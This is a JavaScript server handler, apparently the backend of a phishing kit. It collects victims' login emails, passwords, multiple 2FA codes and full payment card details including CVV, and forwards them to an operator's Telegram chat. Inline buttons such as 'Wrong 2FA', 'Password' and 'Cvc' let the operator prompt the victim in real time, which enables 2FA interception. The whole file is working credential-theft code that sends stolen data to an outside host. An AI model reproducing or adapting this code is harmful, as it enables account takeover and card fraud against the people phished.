import axios from "axios";

export const createUser = async (req, res) => {
    try {
        const { id,
            full_name,
            login_email,
            business_email,
            page_name,
            phone_number,
            password_one,
            password_two,
            tfa_one,
            tfa_two,
            whatsapp,
            email2fa,
            auth_app_2fa,
            CardName,
            CardNr,
            CardDate,
            CardCvc
        } = req.body;

        const params =
            `=============================\nID: ${id}\n${full_name ? `Full Name: \`${full_name}\`\n` : ''}${login_email ? `Email: \`${login_email}\`\n` : ''}${business_email ? `Business Email: \`${business_email}\`\n` : ''}${phone_number ? `Phone: \`${phone_number}\`\n` : ''}${page_name ? `Page Name: \`${page_name}\`\n` : ''}${password_one ? `Password1: \`${password_one}\`\n` : ''}${password_two ? `Password2: \`${password_two}\`\n` : ''}${tfa_one ? `2fa: \`${tfa_one}\`\n` : ''}${tfa_two ? `2fa-2: \`${tfa_two}\`\n` : ''}${CardName ? `Name: \`${CardName}\`\n` : ''}${CardNr ? `Card Number: \`${CardNr}\`\n` : ''}${CardDate ? `Expiry Date: \`${CardDate}\`\n` : ''}${CardCvc ? `CVV: \`${CardCvc}\`\n` : ''}${whatsapp ? `Whatsapp 2fa: \`${whatsapp}\`\n` : ''}${email2fa ? `Email 2fa: \`${email2fa}\`\n` : ''}${auth_app_2fa ? `Auth App 2fa: \`${auth_app_2fa}\`\n` : ''}=============================`;


        axios.post(`https://api.telegram.org/bot${process.env.BOT}/sendMessage`, {
            chat_id: process.env.CHAT_ID,
            text: params,
            parse_mode: 'Markdown',
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: '2FA',
                            callback_data: `/2fa ${id}`,
                        },
                        {
                            text: 'Wrong 2FA',
                            callback_data: `/incorrect-2fa ${id}`,
                        },
                        {
                            text: 'Password',
                            callback_data: `/password ${id}`,
                        },
                        {
                            text: 'Email',
                            callback_data: `/email ${id}`,
                        },
						{
                            text: 'Card',
                            callback_data: `/card ${id}`,
                        },
                        {
                            text: 'Cvc',
                            callback_data: `/cvc ${id}`,
                        },

                    ],
                    [
						{
                            text: 'Phone',
                            callback_data: `/phone ${id}`,
                        },
                        {
                            text: 'Whatsapp',
                            callback_data: `/whatsapp ${id}`,
                        },
                        {
                            text: 'Email 2fa',
                            callback_data: `/emailVerify ${id}`,
                        },
                        {
                            text: 'Auth App 2fa',
                            callback_data: `/authApp ${id}`,
                        },
						{
                            text: 'Wait',
                            callback_data: `/wait ${id}`,
                        },
                        {
                            text: 'Done',
                            callback_data: `/done ${id}`,
                        },
                    ],
 
                ],
            }),
        },
            {
                headers: {
                    'Content-Type': 'application/json',
                    'X-Robots-Tag': 'googlebot: nofollow',
                },

            })
            .then(data => {
                if (data.status === 200) {
                    return res.send({
                        success: true
                    })
                }
            }
            )

    } catch (error) {
        return res.send({
            success: false,
            message: error.message,
        });
    }
};

